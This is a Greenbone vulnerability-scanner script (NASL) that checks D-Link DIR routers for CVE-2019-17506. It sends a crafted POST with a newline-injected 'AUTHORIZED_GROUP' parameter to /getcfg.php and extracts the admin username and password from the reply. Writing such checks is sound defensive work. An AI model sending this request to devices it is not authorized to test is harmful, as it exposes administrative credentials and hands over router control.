# SPDX-FileCopyrightText: 2019 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113547");
  script_version("2025-07-02T05:41:52+0000");
  script_tag(name:"last_modification", value:"2025-07-02 05:41:52 +0000 (Wed, 02 Jul 2025)");
  script_tag(name:"creation_date", value:"2019-10-24 10:50:00 +0200 (Thu, 24 Oct 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-08-24 17:37:00 +0000 (Mon, 24 Aug 2020)");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_cve_id("CVE-2019-17506");

  script_name("D-Link DIR Devices Information Disclosure Vulnerability (Oct 2019)");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2019 Greenbone AG");
  script_family("Web application abuses");

  # nb: Experiences in the past have shown that various different devices are affected
  script_dependencies("gb_dlink_dsl_consolidation.nasl", "gb_dlink_dap_consolidation.nasl",
                      "gb_dlink_dir_consolidation.nasl", "gb_dlink_dwr_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("d-link/http/detected");

  script_tag(name:"summary", value:"Multiple D-Link DIR devices are prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to read administrative credentials.");

  script_tag(name:"insight", value:"Sending a POST request with the content
  'SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a' to /getcfg.php allows unauthenticated user to access
  sensitive information.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to acquire
  administrative credentials and consequently gain control over the router remotely.");

  script_tag(name:"affected", value:"D-Link DIR-868L B1 through firmware version 2.03 and
  D-Link DIR-817LW A1 through firmware version 1.04. Other devices might also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_xref(name:"URL", value:"https://github.com/dahua966/Routers-vuls/blob/master/DIR-868/name%26passwd.py");

  exit(0);
}

CPE_PREFIX = "cpe:/o:dlink";

include( "host_details.inc" );
include( "misc_func.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" ) )
  exit( 0 );

port = infos["port"];
CPE  = infos["cpe"];

if( ! dir = get_app_location( cpe: CPE, port: port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vuln_url = dir + "/getcfg.php";

add_headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );
req = http_post_put_req( port: port, url: vuln_url, add_headers: add_headers,
                     data: 'SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a', accept_header: '*/*' );
buf = http_keepalive_send_recv( port: port, data: req );

if( buf =~ "HTTP/[0-9]\.[0-9] 200" ) {
  username = eregmatch( string: buf, pattern: '<name>([^<]+)</name', icase: TRUE );
  password = eregmatch( string: buf, pattern: '<password>([^<]+)</password>', icase: TRUE );

  if( ! isnull( username[1] ) && ! isnull( password[1] ) ) {
    report = http_report_vuln_url( port: port, url: vuln_url );
    report += '\nIt was possible to acquire the following credentials:\n';
    report += 'Username: ' + username[1] + '\nPassword: ' + password[1];
    security_message( data: report, port: port );
    exit( 0 );
  }
}

exit( 99 );
